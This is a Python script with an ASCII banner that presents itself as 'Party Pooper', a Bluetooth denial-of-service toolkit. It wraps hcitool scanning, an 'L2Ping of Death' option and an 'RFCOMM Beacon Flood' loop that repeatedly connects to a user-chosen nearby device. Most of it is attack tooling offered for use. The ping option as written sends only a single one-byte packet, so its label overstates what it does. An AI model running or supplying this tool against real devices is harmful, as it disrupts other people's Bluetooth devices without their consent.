import subprocess

# Print Banner

print('  _________________________________________________________________________________')
print(' | ░..░ ░░..░░..░ ░.░ .░ ░.░ .░.░..░░ .░ .░░ .░░░░░..░ ░.░ ░░░░..░ ░.░ .░ ░░..░ ░░.')
print(' | ░░░..░ ░.░ _________________________________________________________.░  ░░ ░..░ ')
print(' | ░..░ ░ ░ .|.....................................................    | ░░.░░..  |')
print(' | ...░  .░  |       .........................................         | ..░.,.  .|')
print(' | ░..░ ░    |   0          0               ╓N            o      0     |  ░░. ░ .░|')
print(' |    .    ░░|                              ▓≡wφ╩        o             |░░░.. .   |')
print(' |. ~.. ░.. ░|                            ▓▀µ        .                 |░.  ░-  ░░|')
print(' | ░ ░  .. . |               O          ▄▒▒▒▓                          |  ].  -   |')
print(' | :░.  :.. ¬|        o                ▓▓▓╫▒╫µ           .     0       |░-   ,  ░\|')
print(' |    .      |                        ▓▓▒▒▒▒▒▒▓         .  .           |:  .░░.   |')
print(' | ░. ░░ .:  |           o         ▓▓▓▒▒╫▒▒▓╫▒╫▓▓▓                     |  .    . ░|')
print(' |░..░ ░.░ .░|                 ▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▒▓▓▓▒µ                  | . : ░ ░. |')
print(' | .░ .:..░¬░|     o              ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓              O      |  ░░ ░░   |')
print(' |  ░.  ...  |          0       J▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀▓▓▓          o         |   ░.. ░ ░|')
print(' |░ . .   -. |                 ▓▓▀    ▓▓▓▓▓▓▓      ▓                   |  . ░. ░░:|')
print(' |   ░ .░.░ ░|     o           ▓▓ ▄███  ▓▓▓▓▌ ████ █                   |.. ...  . |')
print(' |...  .  ░ .|                ▓▓▓ █   █ █▓▓▓▌ █  ▓ ▓▓▄        o        |░░░░░..░ ░|')
print(' |  .. ░  ░~░|                ▓▓▓   ▀  ▄▓▓▓▓▓  ▀   ▓▓▓▌                |  -   .░░ |')
print(' |.     :░..░|             ╓▄▄▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╖      O      |: ~~    ..|')
print(' | :..   ░   |           ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▒▓▓▓▓▓▓▓▓▓▓▓▓µ            |.  .░ :  ░|')
print(' |░░. . ░  : |           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓            |░  .░░. ░ |')
print(' | ~....     |           ╨▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╛            |░.:.░.   .|')
print(' |  . ..░.░ .|              ╙▀▀▀▀▀▀▀▀╙╨╙╙╙╙╨▀╙╙╙╨╨╨▀▀╨╙└               | . ░ ..░░░|')
print(' | ...░  .░: |          P A R T Y     ------      P O O P E R          |..░.,.: ..|')
print(' |░░: ░.░░ ░:|      _____________________________________________      |:.░:░    .|')
print(' |   .. ░ ░ .|                                                         |░.░ . ... |')
print(' |:.   .░ : :|            ...Let*s  Make this Party... over.           |   .: ¬░:.|')
print(' |  .   . ..░|_________________________________________________________|░ ░...░:░:|')
print(' |   ..  .. .  .░.. .           .   . ..  . .    .. ~.. ░░░     .░,  .░ .░ ...    |')
print(' |----------------------------- Author: Edgar Medina  ----------------------------|')
print(' |--------------------------------------------------------------------------------|')
print(' |--------------------------------------------------------------------------------|')
print('')

import subprocess

# Start Bluetooth service if not already started
subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)

def scan():
    # Launch xterm window and run hcitool scan inside it
    subprocess.run(['xterm', '-e', 'hcitool scan'], check=True)

def l2ping():
    # Launch xterm window and run l2ping command inside it
    addr = input(" Enter Bluetooth Device Address: ")
    subprocess.run(['xterm', '-e', f'l2ping -c 1 -s 1 {addr}'], check=True)

def rfcomm():
    # Launch xterm window and run rfcomm command inside it
    addr = input(" Enter Bluetooth device address: ")
    cmd = ['rfcomm', 'connect', addr , '1']

    for i in range(0, 1001):
        try:
            # Attempt to connect to the device
            subprocess.run(['xterm', '-e', ' '.join(cmd)], check=True)
            print(  " Connected to device {} on RFCOMM".format(addr))
        except subprocess.CalledProcessError:
            print(  " Failed to connect to device {} on RFCOMM".format(addr))
        print(  ' Connecting...')

# Main program loop
while True:
    # Display menu options
    print(" ============================== *** Party Pooper *** ==============================")
    print(" ==================================================================================")
    print(" ======================    Bluetooth Denial of Service Toolkit  ===================")
    print(" ==================================================================================")
    print(" ============================= 1. Scan for nearby devices =========================")
    print(" ============================= 2. L2Ping of Death         =========================")
    print(" ============================= 3. RFCOMM Beacon Flood     =========================")
    print(" ============================= 4. Quit                    =========================")
    print(" ==================================================================================")
    # Get user input
    choice = input(" Enter an option: ")

    # Execute chosen option
    if choice == '1':
        scan()
    elif choice == '2':
        l2ping()
    elif choice == '3':
        rfcomm()
    elif choice == '4':
        break
    else:
        print(  " Invalid option. Please try again.")
